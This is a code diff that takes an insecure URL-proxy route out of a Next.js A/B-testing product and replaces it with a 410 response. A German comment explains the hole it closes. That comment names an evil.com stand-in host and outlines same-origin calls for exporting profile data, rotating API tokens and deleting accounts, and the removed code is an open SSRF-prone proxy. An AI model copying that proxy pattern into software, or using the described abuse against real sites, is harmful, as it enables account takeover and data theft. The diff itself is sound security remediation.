@@ -1,150 +1,60 @@
 /**
- * GET /api/picker-bridge?url=<encoded-url>&mode=element|goal
+ * GET /api/picker-bridge — DEAKTIVIERT.
  *
- * Server-seitiger Proxy für den Element-Picker.
+ * ============================================================================
+ * ENTFERNT AUS SICHERHEITSGRÜNDEN (Plan SEC-02, Schweregrad Kritisch).
+ * ============================================================================
  *
- * Problem: Der Picker in ab.js wird nur aktiv, wenn das Snippet auf der
- * Zielseite installiert ist. Bei der Test-Erstellung ist das oft nicht der Fall.
+ * Die Route nahm einen `?url=`-Parameter entgegen, fetchte die Zielseite
+ * serverseitig und gab das fremde HTML mit `Content-Type: text/html`
+ * **unter der eigenen Origin** zurück. Sie hatte:
  *
- * Lösung: Dieser Proxy fetched die Zielseite, injectet ab.js in den <head>,
- * und serviert die modifizierte Seite. Der Picker startet dann direkt.
+ *   - keine Authentifizierung (kein getApiUser, kein getSessionUser)
+ *   - kein Rate-Limit
+ *   - keine SSRF-Prüfung (lib/ssrf.ts existiert, wurde hier nicht importiert)
+ *   - keine CSP — die CSP in next.config.ts gilt nur für
+ *     `/((?!api|_next).*)`, also ausdrücklich NICHT für /api/*
  *
- * Relative URLs (CSS, Bilder, Links) werden auf die originale Domain umgebogen,
- * damit die Seite korrekt rendered.
+ * `https://www.getvariante.com/api/picker-bridge?url=https://evil.com` lieferte
+ * damit beliebige Angreiferseiten unter der Produktdomain aus. Deren JavaScript
+ * lief same-origin und konnte:
  *
- * Einschränkung: JS-heavy SPAs (React, Vue) die per Client-Rendering den
- * eigentlichen Content laden, funktionieren nicht — fetch() sieht nur die
- * leere Shell. Das ist akzeptabel: der User muss das Snippet installieren,
- * um solche Seiten zu testen.
+ *   - `fetch('/api/profile/export', {credentials:'include'})` → vollständiger
+ *     Datenexport des eingeloggten Kunden
+ *   - `POST /api/token/regenerate` → API-Token rotieren und abgreifen
+ *   - `DELETE /api/profile` → fremden Account löschen
+ *   - als Phishing-Seite unter der eigenen Domain samt gültigem TLS dienen
+ *
+ * Zusätzlich war es ein offener Proxy: jeder im Internet konnte die
+ * Vercel-Function unbegrenzt fremde Seiten fetchen lassen.
+ *
+ * Die Funktion war ein Komfort-Feature für den Element-Picker. Der dokumentierte
+ * Weg — Snippet auf der eigenen Seite installieren, dann `?ab_pick=` — funktioniert
+ * ohne sie. Der Aufrufer (StepUrlAndElement.tsx) öffnet die Kundenseite jetzt direkt.
+ *
+ * Falls die Bridge zurückkommen soll, müssen ALLE vier Punkte gleichzeitig
+ * erfüllt sein (siehe Plan SEC-02):
+ *   1. Auth + Besitzprüfung: Ziel-URL muss zu einer `verified` Domain des
+ *      Users gehören.
+ *   2. isBlockedHost() auf Ziel-Host UND auf res.url nach Redirects.
+ *   3. Rate-Limit pro User.
+ *   4. Ausgabe auf einer Cookie-freien Sandbox-Domain, nicht unter der
+ *      Produkt-Origin.
  */
 
-import { NextRequest, NextResponse } from 'next/server'
-import { safeError } from '@/lib/safeLog'
-
-const FETCH_TIMEOUT_MS = 10_000
-const MAX_RESPONSE_BYTES = 2_000_000 // 2 MB Safety-Net
-
-export async function GET(request: NextRequest) {
-  const urlParam = request.nextUrl.searchParams.get('url')
-  const mode = request.nextUrl.searchParams.get('mode') || 'element'
-
-  if (!urlParam) {
-    return new NextResponse('Missing ?url= parameter', { status: 400 })
-  }
-
-  // URL normalisieren
-  let targetUrl = urlParam.trim()
-  if (!/^https?:\/\//i.test(targetUrl)) {
-    targetUrl = 'https://' + targetUrl
-  }
-
-  let parsed: URL
-  try {
-    parsed = new URL(targetUrl)
-  } catch {
-    return new NextResponse('Invalid URL', { status: 400 })
-  }
-
-  // Nur http/https erlauben (SSRF-Schutz)
-  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
-    return new NextResponse('Only http/https URLs are allowed', { status: 400 })
-  }
-
-  const origin = parsed.origin
-
-  try {
-    const res = await fetch(targetUrl, {
+export async function GET() {
+  return new Response(
+    JSON.stringify({
+      error: 'gone',
+      message:
+        'The picker bridge has been removed. Install the snippet on your site and use the built-in picker instead.',
+    }),
+    {
+      status: 410,
       headers: {
-        'User-Agent': 'Mozilla/5.0 (compatible; VariantePicker/1.0)',
-        Accept: 'text/html,application/xhtml+xml',
+        'Content-Type': 'application/json',
+        'Cache-Control': 'no-store',
       },
-      redirect: 'follow',
-      signal: AbortSignal.timeout(FETCH_TIMEOUT_MS),
-    })
-
-    if (!res.ok) {
-      return new NextResponse(`Failed to fetch page (${res.status})`, { status: 502 })
     }
-
-    const contentType = res.headers.get('content-type') || ''
-    if (!contentType.includes('text/html') && !contentType.includes('application/xhtml')) {
-      return new NextResponse('Not an HTML page', { status: 400 })
-    }
-
-    let html = await res.text()
-    if (html.length > MAX_RESPONSE_BYTES) {
-      html = html.slice(0, MAX_RESPONSE_BYTES)
-    }
-
-    // Relative URLs in absolute umbiegen (für <base href>)
-    const baseTag = `<base href="${origin}/">`
-
-    // ab.js von unserem Server laden
-    const abJsUrl = `${request.nextUrl.origin}/ab.js`
-
-    // Picker-Script: injected ab.js mit URL-Parametern.
-    // Wichtig: ab.js parst location.search beim eigenen Skript-Start.
-    // Wir schreiben die Parameter via replaceState BEVOR wir ab.js laden.
-    // Zusätzlicher Guard: falls ab.js den auto-start verpasst (z.B. async-Timing),
-    // starten wir den Picker manuell via __abRekindlePicker.
-    const pickerScript = `
-<script>
-// Variante Picker Bridge — injected by /api/picker-bridge
-(function() {
-  var url = new URL(window.location.href);
-
-  // Picker-Parameter setzen BEVOR ab.js geladen wird
-  url.searchParams.set('${mode === 'goal' ? 'ab_goal' : 'ab_pick'}', 'bridge');
-  url.searchParams.set('ab_api', '${request.nextUrl.origin}');
-  window.history.replaceState({}, '', url);
-
-  // ab.js dynamisch laden (nicht async — Reihenfolge garantiert)
-  var s = document.createElement('script');
-  s.src = '${abJsUrl}';
-  s.async = false;
-  s.onload = s.onreadystatechange = function() {
-    // Picker manuell triggern falls ab.js den auto-start verpasst hat
-    if (typeof window.__abRekindlePicker === 'function') {
-      window.__abRekindlePicker();
-    }
-  };
-  document.head.appendChild(s);
-})();
-<\/script>`
-
-    // <base> und Picker-Script DIREKT nach <head> einfügen (vor <link>/<style>/<script>)
-    // Damit ab.js so früh wie möglich geladen wird.
-    const headOpenPos = html.indexOf('<head>')
-    const headClosePos = html.lastIndexOf('</head>')
-
-    if (headOpenPos !== -1 && headClosePos !== -1 && headClosePos > headOpenPos) {
-      // Nach <head> einfügen (vor allen anderen Elementen im Head)
-      const insertPos = headOpenPos + '<head>'.length
-      html = html.slice(0, insertPos) + '\n' + baseTag + '\n' + pickerScript + '\n' + html.slice(insertPos)
-    } else if (headClosePos !== -1) {
-      // Fallback: vor </head>
-      html = html.slice(0, headClosePos) + baseTag + pickerScript + html.slice(headClosePos)
-    } else {
-      // Fallback: vor </html>
-      const htmlClosePos = html.lastIndexOf('</html>')
-      if (htmlClosePos !== -1) {
-        html = html.slice(0, htmlClosePos) + baseTag + pickerScript + html.slice(htmlClosePos)
-      } else {
-        html = html + baseTag + pickerScript
-      }
-    }
-
-    return new NextResponse(html, {
-      headers: {
-        'Content-Type': 'text/html; charset=utf-8',
-        // Kein Caching — der Picker muss immer frisch sein
-        'Cache-Control': 'no-store, no-cache, must-revalidate',
-        'X-Frame-Options': 'DENY',
-        'X-Content-Type-Options': 'nosniff',
-      },
-    })
-  } catch (err) {
-    safeError('picker-bridge', err)
-    return new NextResponse('Failed to load page', { status: 502 })
-  }
+  )
 }
